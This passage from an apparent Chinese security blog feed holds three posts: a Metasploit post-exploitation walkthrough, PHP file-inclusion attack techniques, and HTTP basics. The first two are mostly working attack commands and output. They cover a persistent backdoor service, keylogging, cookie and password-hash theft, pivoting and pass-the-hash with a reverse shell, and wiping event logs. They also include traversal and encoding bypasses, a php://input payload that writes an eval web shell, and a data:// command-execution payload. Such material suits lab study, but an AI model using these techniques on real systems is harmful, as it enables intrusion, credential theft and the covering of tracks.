<h3 id="2-2-metsvc后渗透攻击模块"><a href="#2-2-metsvc后渗透攻击模块" class="headerlink" title="2.2 metsvc后渗透攻击模块"></a><strong>2.2 metsvc后渗透攻击模块</strong></h3><p>主要是在目标主机的31337端口开启后门监听服务，并上传3个meterpreter模块</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run metsvc </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. <span class="keyword">Try</span> exploit/windows/local/persistence.</span><br><span class="line">[!] Example: run exploit/windows/local/persistence OPTION=value [<span class="type">...</span>]</span><br><span class="line">[*] Creating a meterpreter service on port <span class="number">31337</span></span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\dpcuvwyl...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc<span class="literal">-server</span>.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">         * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure>

<p>以上两个模块都容易被杀毒软件检测到，实用性不强，可上传免杀处理后的远程控制工具。</p>
<h3 id="2-3-权限提升"><a href="#2-3-权限提升" class="headerlink" title="2.3 权限提升"></a><strong>2.3 权限提升</strong></h3><p>getsysytem  命令集成了四种权限提升技术</p>
<p>分别利用了MS09-012和MS10-015、MS10-073、MS10-092中的漏洞 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/modules/post/windows/escalate# ls</span><br><span class="line">droplnk.rb  getsystem.rb  golden_ticket.rb  ms10_073_kbdlayout.rb  screen_unlock.rb  unmarshal_cmd_exec.rb</span><br></pre></td></tr></table></figure>



<h3 id="2-4-信息获取"><a href="#2-4-信息获取" class="headerlink" title="2.4 信息获取"></a><strong>2.4 信息获取</strong></h3><p><strong>dumplink模块：获取目标主机最近的系统操作、访问文件和office文档的操作记录</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/dumplinks </span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Running as SYSTEM extracting user list...</span><br><span class="line">[*] Extracting lnk files <span class="keyword">for</span> user Administrator at C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\...</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\<span class="number">01</span>.靶场夺旗第一关.pdf.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Chapter_1L.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\lab.txt.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\malware.lnk.</span><br></pre></td></tr></table></figure>



<p><strong>enum_applications模块：获取目标主机安装的软件、安全更新与漏洞补丁的信息</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications </span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on STU1</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148</span><br><span class="line"> Microsoft Visual C++ 2017 X86 Minimum Runtime - 14.16.27033     14.16.27033</span><br><span class="line"> Mozilla Firefox 69.0.1 (x86 zh-CN)                              69.0.1</span><br><span class="line"> Nmap 7.80                                                       7.80</span><br><span class="line"> Nmap 7.80                                                       7.80</span><br><span class="line"> Notepad++ (32-bit x86)                                          7.7.1</span><br><span class="line"> Npcap 0.9983                                                    0.9983</span><br><span class="line"> WinPcap 4.1.3                                                   4.1.0.2980</span><br><span class="line"> WinPcap 4.1.3                                                   4.1.0.2980</span><br><span class="line"> Wireshark 3.0.4 32-bit                                          3.0.4</span><br><span class="line"> Wireshark 3.0.4 32-bit                                          3.0.4</span><br><span class="line"></span><br><span class="line">[+] Results stored in: /root/.msf4/loot/20200912201743_default_192.168.126.151_host.application_539875.txt</span><br></pre></td></tr></table></figure>

<p><strong>获取键盘记录，从start开始记录</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start </span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_dump </span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">&lt;Left Windows&gt;ist mimi&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop </span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure>



<h3 id="2-5-口令获取和利用"><a href="#2-5-口令获取和利用" class="headerlink" title="2.5 口令获取和利用"></a><strong>2.5 口令获取和利用</strong></h3><p><strong>通过网络嗅探获取，在post/windows/gather/credentials目录下有许多这一块的攻击模块</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use sniffer </span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; sniffer_interfaces <span class="comment">#获取网卡</span></span><br><span class="line"><span class="number">1</span> - <span class="string">'WAN Miniport (Network Monitor)'</span> ( type:<span class="number">3</span> mtu:<span class="number">1514</span> usable:true dhcp:false wifi:false )</span><br><span class="line"><span class="number">2</span> - <span class="string">'Intel(R) PRO/1000 MT Network Connection'</span> ( type:<span class="number">0</span> mtu:<span class="number">1514</span> usable:true dhcp:false wifi:false )</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_start <span class="number">1</span></span><br><span class="line">[*] Capture started on interface <span class="number">1</span> (<span class="number">50000</span> packet buffer)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_dump <span class="number">1</span> /root/xp1.cap <span class="comment">#保存在本地，再用wireshark分析</span></span><br><span class="line">[*] Flushing packet capture buffer <span class="keyword">for</span> interface <span class="number">1</span>...</span><br><span class="line">[*] Flushed <span class="number">0</span> packets (<span class="number">0</span> bytes)</span><br><span class="line">[*] Download completed, converting to PCAP...</span><br><span class="line">[*] PCAP file written to /root/xp1.cap</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_stop <span class="number">1</span></span><br><span class="line">[*] Capture stopped on interface <span class="number">1</span></span><br><span class="line">[*] There are <span class="number">0</span> packets (<span class="number">0</span> bytes) remaining</span><br><span class="line">[*] Download or release them <span class="keyword">using</span> <span class="string">'sniffer_dump'</span> or <span class="string">'sniffer_release'</span></span><br></pre></td></tr></table></figure>

<p><strong>通过浏览器获取关键信息，如cookie、历史记录、密码等</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_ie </span><br><span class="line"></span><br><span class="line">[*] IE Version: <span class="number">8.0</span>.<span class="number">7601.17514</span></span><br><span class="line">[*] Retrieving history.....</span><br><span class="line">        File: C:\Users\Administrator\AppData\Local\Microsoft\Windows\History\History.IE5\index.dat</span><br><span class="line">        File: </span><br><span class="line">[*] Looping through history to find autocomplete data....</span><br><span class="line">[-] No autocomplete entries found <span class="keyword">in</span> registry</span><br><span class="line">[*] Looking <span class="keyword">in</span> the Credential Store <span class="keyword">for</span> HTTP Authentication Creds...</span><br><span class="line">[*] Writing history to loot...</span><br><span class="line">[+] <span class="keyword">Data</span> saved <span class="keyword">in</span>: /root/.msf4/loot/<span class="number">20200912205807</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_ie.history_734619.txt</span><br><span class="line">[*] Writing cookies to loot...</span><br><span class="line">[+] <span class="keyword">Data</span> saved <span class="keyword">in</span>: /root/.msf4/loot/<span class="number">20200912205807</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_ie.cookies_282520.txt</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/smart_hashdump  <span class="comment">#获取系统口令的哈希值</span></span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database <span class="keyword">if</span> one is connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format to:</span><br><span class="line">[*] /root/.msf4/loot/<span class="number">20200912210516</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_windows.hashes_975340.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key <span class="keyword">using</span> SYSKEY fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[*]     No users with password hints on this system</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     liukaifeng01:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>



<h3 id="2-6-内网拓展"><a href="#2-6-内网拓展" class="headerlink" title="2.6 内网拓展"></a><strong>2.6 内网拓展</strong></h3><p><strong>内网拓展功能，添加路由，将目标机器作为跳板机进入内网其它主机，有以下两种方式：</strong>                                                                                                                                                                                                                                                                                                                                                                                                                                   </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">126.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; route add <span class="number">192.168</span>.<span class="number">52.0</span> <span class="number">255.255</span>.<span class="number">255.0</span> <span class="number">3</span></span><br><span class="line">[*] Route added</span><br><span class="line">msf5 exploit(multi/handler) &gt; route print </span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">192.168</span>.<span class="number">52.0</span>       <span class="number">255.255</span>.<span class="number">255.0</span>      Session <span class="number">3</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp </span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">24</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span></span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set ports <span class="number">445</span></span><br><span class="line">ports =&gt; <span class="number">445</span></span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span>:      - Scanned  <span class="number">13</span> of <span class="number">128</span> hosts (<span class="number">10</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span>:      - Scanned <span class="number">128</span> of <span class="number">128</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line"></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">126.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">meterpreter &gt; run autoroute <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[*] Adding a route to <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span>...</span><br></pre></td></tr></table></figure>



<p><strong>利用获取的口令进行传递攻击，如果密码一致，就可成功返回meterpreter会话：</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set lhost <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set lport <span class="number">443</span></span><br><span class="line">lport =&gt; <span class="number">443</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.138</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.138</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBPass b4df3d6cb6929cc09cb07285b13aca78:<span class="number">9</span>c8be841d72dbd132d22477ff8b7e9d3</span><br><span class="line">SMBPass =&gt; b4df3d6cb6929cc09cb07285b13aca78:<span class="number">9</span>c8be841d72dbd132d22477ff8b7e9d3</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">443</span> </span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> - Connecting to the server...</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> - Authenticating to <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> as user <span class="string">''</span>...</span><br></pre></td></tr></table></figure>



<h3 id="2-7-掩踪灭迹"><a href="#2-7-掩踪灭迹" class="headerlink" title="2.7 掩踪灭迹"></a><strong>2.7 掩踪灭迹</strong></h3><p><strong>清除日志痕迹</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line">[*] Wiping <span class="number">1509</span> records from Application...</span><br><span class="line">[*] Wiping <span class="number">4759</span> records from System...</span><br><span class="line">[*] Wiping <span class="number">1453</span> records from Security...</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>PHP安全</title>
    <url>/2020/07/11/PHP%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h2><h3 id="1-1-本地文件包含"><a href="#1-1-本地文件包含" class="headerlink" title="1.1 本地文件包含"></a><strong>1.1 本地文件包含</strong></h3><p><strong>../ 表示上一层目录，多../../../ 即可绕过前缀限制</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~/desktop/chj# cd /root/tools/../../etc</span><br><span class="line">root@kali:/etc#</span><br></pre></td></tr></table></figure>

<p><strong>PHP内核是由C语言实现的，所以0字节(\x00)将作为字符串结束，web输入时转为urlencode变成%00</strong></p>
<p><strong>即输入?file=../../etc/passwd%00 实际包含文件会变成/etc/passwd</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'/home/run/'</span>.$file.<span class="string">'.php'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'/home/run'</span>.$file.<span class="string">'.php'</span>;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>但是通常情况下，网站管理员会禁止0字节，这时候可以利用其它技巧</strong></p>
<p><strong>原理：目录字符串在windows下256字节、linux下4096字节时会达到最大值，之后的字符将被丢弃</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/passwd/././././././././././././abc</span><br><span class="line">/etc/passwd//////////////////abc</span><br><span class="line">/etc/passwd.........................  #点号截断适用于Windows系统</span><br></pre></td></tr></table></figure>

<p><strong>可以通过不同的编码方式来绕过一些服务器端逻辑：</strong></p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="left"><strong>url编码</strong></th>
<th align="left"><strong>二次编码</strong></th>
<th align="left">web容器编码</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>../</strong></td>
<td align="left"><strong>%2e%2e%2f <br>..%2f <br>%2e%2e/</strong></td>
<td align="left"><strong>%252e%252e%252f</strong></td>
<td align="left"><strong>..%c0%af</strong></td>
</tr>
<tr>
<td align="center"><strong>..\</strong></td>
<td align="left"><strong>%2e%2e%5c<br> ..%5c <br>%2e%2e</strong></td>
<td align="left"><strong>%252e%252e%255c</strong></td>
<td align="left"><strong>..%c1%9c</strong></td>
</tr>
<tr>
<td align="center"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>防护手段：配置open_basedir、避免包含动态变量，可以枚举出file的值</strong></p>
<p><strong>例如：open_basedir = /home/app/aaa  那么 /home/app/aaabbb 也是合法的</strong></p>
<p><strong>如果要限定目录，则设置为open_basedir = /home/app/aaa/ 即可</strong></p>
<p><strong>如果要配置多个目录的话在windows下用分号，linux下用冒号隔开</strong></p>
<h3 id="1-2-远程文件包含"><a href="#1-2-远程文件包含" class="headerlink" title="1.2 远程文件包含"></a><strong>1.2 远程文件包含</strong></h3><p><strong>漏洞利用条件：</strong></p>
<ul>
<li><strong>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</strong></li>
<li><strong>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件</strong></li>
</ul>
<p><strong>测试代码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">     <span class="keyword">include</span>($filename.”.html”);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 问号绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt?</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ＃号绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt%23(#号要编码)</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 空格绕过</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=http://192.168.1.110/xiaohua.txt%20(%20是空格的url编码)</span></span><br></pre></td></tr></table></figure>

<h3 id="1-3-本地文件包含的利用技巧"><a href="#1-3-本地文件包含的利用技巧" class="headerlink" title="1.3 本地文件包含的利用技巧"></a><strong>1.3 本地文件包含的利用技巧</strong></h3><p><strong>本地文件包含漏洞在某些条件下也可以执行PHP代码，以下是几种常见的技巧：</strong></p>
<p><strong>（1）包含用户上传的文件</strong></p>
<p><strong>如果用户上传的文件内容中包含了PHP代码，那么将被include（）加载后执行</strong></p>
<p><strong>（2）包含data://或php://input 等伪协议</strong></p>
<p><strong>（3）包含Session文件</strong></p>
<p><strong>（4）包含日志文件，如web server 的 access log</strong></p>
<p><strong>（5）包含上传的临时文件（RFC1867)</strong></p>
<p><strong>（6）包含/proc/self/environ 文件</strong></p>
<p><strong>（7）包含其它应用创建的文件，如数据库文件、缓存文件、应用日志等</strong></p>
<p><strong>下面着重分析下其中几种技巧的原理：</strong></p>
<p><strong>PHP伪协议：</strong></p>
<p><strong>PHP带了很多内置URL风格的封装协议，可用于fopen、copy、file_exists和filesize等文件系统函数。除了这些内置封装协议，还能通过stream_wrapper_register注册自定义的封装协议。这些协议都被称为伪协议。</strong></p>
<table>
<thead>
<tr>
<th align="center">php://   访问各个输入/输出流</th>
<th align="center"><strong>File:// ——访问本地文件系统</strong></th>
<th align="center"><strong>phar://  PHP归档</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>data://  读取数据(RFC2397)</strong></td>
<td align="center"><strong>ftp:// ——访问FTP(s)URLs</strong></td>
<td align="center"><strong>zlib://   压缩流</strong></td>
</tr>
<tr>
<td align="center"><strong>glob://  查找匹配的文件路径模式</strong></td>
<td align="center"><strong>http:// ——访问HTTP(s)网址</strong></td>
<td align="center"><strong>expect:// 处理交互式的流</strong></td>
</tr>
</tbody></table>
<h4 id="php-filter伪协议"><a href="#php-filter伪协议" class="headerlink" title="php://filter伪协议"></a><strong>php://filter伪协议</strong></h4><p>php://filter 是元封装器，设计用于数据流打开时的筛选过滤应用,对本地磁盘文件进行读写。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#利用php:filter读本地磁盘文件时不需要开启allow_url_fopen和allow_url_include</span></span><br><span class="line">(<span class="number">1</span>):filename=php:<span class="comment">//filter/read=convert.base64-encode/resource=xx.php</span></span><br><span class="line">(<span class="number">2</span>):filename=php:<span class="comment">//filter/convert.base64-encode/resource=xxx.php</span></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">  <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/2.php?filename=php://filter/read=convert.base64-encode/resource=2.php</span></span><br><span class="line">得到<span class="number">2.</span>php的base64编码</span><br><span class="line">    PD9waHANCiRmaWxlbmFtZT0kX0dFVFsnZmlsZW5hbWUnXTsNCmluY2x1ZGUoJGZpbGVuYW1lKTsNCj8+</span><br></pre></td></tr></table></figure>

<h4 id="php-input伪协议"><a href="#php-input伪协议" class="headerlink" title="php://input伪协议"></a><strong>php://input伪协议</strong></h4><p><strong>php://input可以访问请求的原始数据的只读流，即可以直接读取POST上没有经过解析的原始数据，但是使用enctype=”multipart/form-data”的时候php://input是无效的</strong></p>
<p><strong>代码例子：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#漏洞环境：需要开启allow_url_include=on</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#写入木马payload如下：</span></span><br><span class="line">URL: http:<span class="comment">//192.168.1.110/test.php?filename=php://input</span></span><br><span class="line">POST:<span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[xiaohua])&gt;'</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#执行命令POST部分</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>可以看到，成功在本地生成一个shell.php，并写入一句话木马</strong></p>
<p><strong><img src="/2020/07/11/PHP%E5%AE%89%E5%85%A8/1.png" alt></strong></p>
<h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a><strong>data://伪协议</strong></h4><p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#漏洞环境</span></span><br><span class="line">allow_url_include=on</span><br><span class="line">allow_url_fopen=on </span><br><span class="line"><span class="comment">#data://text/plain;base64,xxxx(base64编码后的数据)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/2.php?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKT8%2b</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"dir"</span>)<span class="meta">?&gt;</span>编码为PD9waHAgc3lzdGVtKCJkaXIiKT8+</span><br><span class="line">注意这里+需要url编码为%<span class="number">2</span>b才可以运行</span><br></pre></td></tr></table></figure>

<p>成功执行dir命令</p>
<p><img src="/2020/07/11/PHP%E5%AE%89%E5%85%A8/2.png" alt></p>
]]></content>
  </entry>
  <entry>
    <title>web基础</title>
    <url>/2020/06/17/web%E5%9F%BA%E7%A1%80-1/</url>
    <content><![CDATA[<h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><h4 id="1-HTTP的基本概念"><a href="#1-HTTP的基本概念" class="headerlink" title="1.HTTP的基本概念"></a><strong>1.HTTP的基本概念</strong></h4><p>HTTP：<a href="https://baike.baidu.com/item/超文本传输协议/8535513" target="_blank" rel="noopener">超文本传输协议</a>（HTTP，HyperText Transfer Protocol)是<a href="https://baike.baidu.com/item/互联网" target="_blank" rel="noopener">互联网</a>上应用最为广泛的一种<a href="https://baike.baidu.com/item/网络协议/328636" target="_blank" rel="noopener">网络协议</a>。设计Http最初的目的是为了提供一种发布和接收<a href="https://baike.baidu.com/item/HTML" target="_blank" rel="noopener">HTML</a>页面的方法。它可以使浏览器更加高效。Http协议是以明文方式发送信息的，如果黑客截取了Web浏览器和服务器之间的传输报文，就可以直接获得其中的信息。</p>
<p><strong>HTTP原理：</strong></p>
<p>①  客户端的浏览器首先要通过网络与服务器建立连接，该<strong>连接是通过TCP 来完成的，一般 TCP 连接的端口号是80</strong>。  建立连接后，客户机发送一个请求给服务器，请求方式的格式为：<strong>统一资源标识符（URL）、协议版本号，后边是 MIME  信息包括请求修饰符、客户机信息和许可内容。</strong></p>
<p>② 服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是 MIME 信息包括服务器信息、实体信息和可能的内容。</p>
<h4 id="—-常见的HTTP相应状态码"><a href="#—-常见的HTTP相应状态码" class="headerlink" title="—-常见的HTTP相应状态码"></a><strong>—-常见的HTTP相应状态码</strong></h4><p>200：请求被正常处理<br>204：请求被受理但没有资源可以返回<br>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。<br>301：永久性重定向<br>302：临时重定向<br>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上<br>304：发送附带条件的请求时，条件不满足时返回，与重定向无关<br>307：临时重定向，与302类似，只是强制要求使用POST方法<br>400：请求报文语法有误，服务器无法识别<br>401：请求需要认证<br>403：请求的对应资源禁止被访问<br>404：服务器无法找到对应资源<br>500：服务器内部错误<br>503：服务器正忙</p>
<h4 id="—-GET方法与POST方法的区别"><a href="#—-GET方法与POST方法的区别" class="headerlink" title="—-GET方法与POST方法的区别"></a>—-GET方法与POST方法的区别</h4><p>区别一：<br>get重点在从服务器上获取资源，post重点在向服务器发送数据；<br>区别二：<br>get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，<strong>多个请求数据间用”&amp;”连接</strong>，如<a href="http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；" target="_blank" rel="noopener">http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；</a><br>post传输数据通过Http的post机制，将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的；<br>区别三：<br>Get传输的数据量小，因为受URL长度限制，但效率较高；<br><strong>Post可以传输大量数据，所以上传文件时只能用Post方式</strong>；<br>区别四：<br>get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等；<br>post较get安全性较高；<br>区别五：<br>get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。<br><strong>post支持标准字符集，可以正确传递中文字符</strong>。</p>
<h4 id="—-HTTP请求报文与响应报文格式"><a href="#—-HTTP请求报文与响应报文格式" class="headerlink" title="—-HTTP请求报文与响应报文格式"></a><strong>—-HTTP请求报文与响应报文格式</strong></h4><p><strong>请求报文</strong>包含三部分：<br>a、请求行：包含<strong>请求方法、URI、HTTP版本信息</strong><br>b、请求首部字段<br>c、请求内容实体<br><strong>响应报文</strong>包含三部分：<br>a、状态行：<strong>包含HTTP版本、状态码、状态码的原因短语</strong><br>b、响应首部字段<br>c、响应内容实体</p>
